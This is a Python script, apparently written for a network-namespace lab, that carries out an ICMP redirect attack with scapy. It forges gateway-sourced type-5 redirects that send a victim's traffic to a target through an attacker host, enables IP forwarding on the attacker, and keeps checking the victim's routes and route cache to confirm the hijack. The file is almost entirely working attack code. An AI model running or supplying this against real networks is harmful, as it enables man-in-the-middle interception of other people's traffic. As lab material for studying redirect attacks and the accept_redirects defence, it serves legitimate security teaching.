#!/usr/bin/python3
from scapy.all import IP, ICMP, UDP, send, Raw
import sys
import time
import logging
import subprocess
import os

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] %(message)s'
)

def check_root():
    if os.geteuid() != 0:
        logging.error("[!] This script must be run as root!")
        sys.exit(1)

def send_icmp_redirect(victim_ip, gateway_ip, attacker_ip, target_ip):
    """Send ICMP redirect packets to manipulate victim's routing"""
    logging.info("[*] Starting ICMP redirect attack...")
    
    packet_code = f"""
from scapy.all import *

redirect = IP(
    src='{gateway_ip}',
    dst='{victim_ip}',
    ttl=64
)/ICMP(
    type=5,
    code=1,
    gw='{attacker_ip}'
)/IP(
    src='{victim_ip}',
    dst='{target_ip}',
    ttl=64
)/ICMP(
    type=8,
    code=0
)

for i in range(20):
    # First, generate some legitimate traffic
    ping_pkt = IP(src='{victim_ip}', dst='{target_ip}')/ICMP(type=8, code=0)
    send(ping_pkt, iface='a-eth0', verbose=0)
    time.sleep(0.01)
    
    # Then immediately send the redirect
    send(redirect, iface='a-eth0', verbose=0)
"""

    try:
        # Prepare the environment
        prep_commands = [
            f"ip netns exec victim ip route flush cache",
            f"ip netns exec victim ip route del {target_ip} via {attacker_ip} 2>/dev/null || true",
            f"ip netns exec victim ip route add default via {gateway_ip}",
            "ip netns exec attacker sysctl -w net.ipv4.ip_forward=1"
        ]
        
        for cmd in prep_commands:
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        while True:
            try:
                redirect_status = subprocess.run(
                    "ip netns exec victim sysctl -n net.ipv4.conf.all.accept_redirects",
                    shell=True, capture_output=True, text=True
                ).stdout.strip()

                if redirect_status == "1":
                    logging.info("[+] ICMP redirects enabled - attempting attack")
                    
                    subprocess.run(f"ip netns exec victim ping -c 2 -W 1 {target_ip}", 
                                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                    with open('/tmp/packet.py', 'w') as f:
                        f.write("from scapy.all import *\n")
                        f.write(packet_code)
                    subprocess.run("ip netns exec attacker python3 /tmp/packet.py", 
                                shell=True, stderr=subprocess.DEVNULL)
                    logging.info(f"[>] Sent ICMP redirect to {victim_ip}")
                    
                    def check_route_hijacked():
                        try:
                            route_check = subprocess.run(
                                f"ip netns exec victim ip route get {target_ip}",
                                shell=True, capture_output=True, text=True
                            ).stdout.strip()
                            
                            cache_check = subprocess.run(
                                "ip netns exec victim ip route show cache",
                                shell=True, capture_output=True, text=True
                            ).stdout.strip()
                            
                            return any([
                                f"via {attacker_ip}" in route_check,
                                "<redirected>" in cache_check,
                                attacker_ip in route_check,
                                attacker_ip in cache_check
                            ])
                        except Exception as e:
                            logging.error(f"[!] Route check error: {e}")
                            return False

                    if check_route_hijacked():
                        logging.info("[+] Attack successful - Route hijacked!")
                        subprocess.run("ip netns exec victim ip route show", shell=True)
                        subprocess.run("ip netns exec victim ip route show cache", shell=True)
                        time.sleep(1)
                    else:
                        logging.warning("[*] Route not yet modified, continuing attack...")
                
                else:
                    logging.info("[-] ICMP redirects disabled - attack blocked")
                    logging.info("[!] Attack blocked by security settings")
                    subprocess.run("ip netns exec victim ip route show", shell=True)
                
            except Exception as e:
                logging.error(f"[!] Error during attack: {e}")
            
            time.sleep(1)
            
    except KeyboardInterrupt:
        logging.info("[*] Attack stopped by user")
        subprocess.run("rm -f /tmp/packet.py", shell=True)

if __name__ == "__main__":
    check_root()
    if len(sys.argv) != 5:
        print("Usage: ./icmp_redirect_attack.py <victim_ip> <gateway_ip> <attacker_ip> <target_ip>")
        print("Example: ./icmp_redirect_attack.py 192.168.1.10 192.168.1.1 192.168.1.20 8.8.8.8")
        sys.exit(1)
    
    victim_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    attacker_ip = sys.argv[3]
    target_ip = sys.argv[4]

    send_icmp_redirect(victim_ip, gateway_ip, attacker_ip, target_ip)